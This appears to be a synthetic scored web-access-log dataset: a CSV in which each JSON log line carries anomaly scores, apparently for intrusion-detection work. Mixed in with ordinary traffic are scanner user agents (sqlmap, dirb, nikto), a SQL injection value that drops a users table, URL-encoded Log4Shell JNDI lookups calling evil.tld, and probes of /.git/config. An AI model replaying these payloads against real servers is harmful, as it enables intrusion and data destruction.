score_content,score_session,score_fused,score_fused_norm,line
24.000547409057617,,24.000547409057617,24.000547409057617,{"remote_addr": "79.149.191.28", "time_local": "11/Jan/2025:09:00:00 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8152, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
46.50216293334961,,46.50216293334961,46.50216293334961,{"remote_addr": "113.163.140.198", "time_local": "11/Jan/2025:09:00:01 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 8602, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
68.53112030029297,,68.53112030029297,68.53112030029297,{"remote_addr": "63.184.97.127", "time_local": "11/Jan/2025:09:00:01 -0700", "request": "HEAD /search?q=monitor HTTP/2", "status": 204, "body_bytes_sent": 12637, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
0.24457307159900665,,0.24457307159900665,0.24457307159900665,{"remote_addr": "232.124.172.1", "time_local": "11/Jan/2025:09:00:02 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 5128, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
25.165693283081055,,25.165693283081055,25.165693283081055,{"remote_addr": "104.43.52.231", "time_local": "11/Jan/2025:09:00:03 -0700", "request": "DELETE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 7846, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
34.977848052978516,,34.977848052978516,34.977848052978516,{"remote_addr": "18.174.189.49", "time_local": "11/Jan/2025:09:00:04 -0700", "request": "PUT /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 12684, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
25.249834060668945,,25.249834060668945,25.249834060668945,{"remote_addr": "240.112.217.146", "time_local": "11/Jan/2025:09:00:04 -0700", "request": "DELETE /index.html HTTP/2", "status": 200, "body_bytes_sent": 15122, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
68.47894287109375,,68.47894287109375,68.47894287109375,{"remote_addr": "92.9.240.187", "time_local": "11/Jan/2025:09:00:05 -0700", "request": "HEAD /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 11274, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
48.90309143066406,,48.90309143066406,48.90309143066406,{"remote_addr": "11.46.160.128", "time_local": "11/Jan/2025:09:00:06 -0700", "request": "DELETE /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 14989, "http_referer": "-", "http_user_agent": "dirb/2.22"}
25.24304962158203,,25.24304962158203,25.24304962158203,{"remote_addr": "102.150.171.22", "time_local": "11/Jan/2025:09:00:07 -0700", "request": "DELETE /index.html HTTP/2", "status": 200, "body_bytes_sent": 13023, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
72.19009399414062,,72.19009399414062,72.19009399414062,{"remote_addr": "112.32.217.161", "time_local": "11/Jan/2025:09:00:08 -0700", "request": "OPTIONS / HTTP/2", "status": 200, "body_bytes_sent": 9036, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
72.78264617919922,,72.78264617919922,72.78264617919922,{"remote_addr": "196.196.129.142", "time_local": "11/Jan/2025:09:00:08 -0700", "request": "OPTIONS /cgi-bin/test.cgi HTTP/2", "status": 301, "body_bytes_sent": 14422, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
48.820518493652344,,48.820518493652344,48.820518493652344,{"remote_addr": "169.45.210.229", "time_local": "11/Jan/2025:09:00:09 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 2895, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.048389434814453,,24.048389434814453,24.048389434814453,{"remote_addr": "248.130.66.97", "time_local": "11/Jan/2025:09:00:10 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 8937, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.901068687438965,,2.901068687438965,2.901068687438965,{"remote_addr": "185.57.219.142", "time_local": "11/Jan/2025:09:00:11 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 10388, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
1.9672489166259766,,1.9672489166259766,1.9672489166259766,{"remote_addr": "239.139.226.183", "time_local": "11/Jan/2025:09:00:12 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 9360, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
48.92979431152344,,48.92979431152344,48.92979431152344,{"remote_addr": "98.157.147.67", "time_local": "11/Jan/2025:09:00:13 -0700", "request": "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 4767, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
70.32849884033203,,70.32849884033203,70.32849884033203,{"remote_addr": "19.231.59.58", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 17320, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
68.58623504638672,,68.58623504638672,68.58623504638672,{"remote_addr": "140.152.115.152", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 16360, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
24.016965866088867,,24.016965866088867,24.016965866088867,{"remote_addr": "23.14.97.145", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "GET /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 6917, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
24.00128173828125,,24.00128173828125,24.00128173828125,{"remote_addr": "190.132.180.109", "time_local": "11/Jan/2025:09:00:15 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 3159, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
94.05284881591797,,94.05284881591797,94.05284881591797,{"remote_addr": "117.254.9.27", "time_local": "11/Jan/2025:09:00:16 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16184, "http_referer": "-", "http_user_agent": "dirb/2.22"}
0.2688409686088562,,0.2688409686088562,0.2688409686088562,{"remote_addr": "118.61.190.217", "time_local": "11/Jan/2025:09:00:16 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11051, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
46.553653717041016,,46.553653717041016,46.553653717041016,{"remote_addr": "120.114.183.51", "time_local": "11/Jan/2025:09:00:17 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 2701, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
34.90292739868164,,34.90292739868164,34.90292739868164,{"remote_addr": "171.235.162.203", "time_local": "11/Jan/2025:09:00:18 -0700", "request": "PUT /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 12193, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
26.638652801513672,,26.638652801513672,26.638652801513672,{"remote_addr": "30.130.241.15", "time_local": "11/Jan/2025:09:00:18 -0700", "request": "POST /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 10140, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
46.41109848022461,,46.41109848022461,46.41109848022461,{"remote_addr": "178.5.5.164", "time_local": "11/Jan/2025:09:00:19 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 6157, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
4.586278438568115,,4.586278438568115,4.586278438568115,{"remote_addr": "94.197.246.201", "time_local": "11/Jan/2025:09:00:20 -0700", "request": "GET /profile HTTP/2", "status": 302, "body_bytes_sent": 7225, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30167.904296875,,30167.904296875,30167.904296875,{"remote_addr": "136.243.61.144", "time_local": "11/Jan/2025:09:00:21 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 400, "body_bytes_sent": 465, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
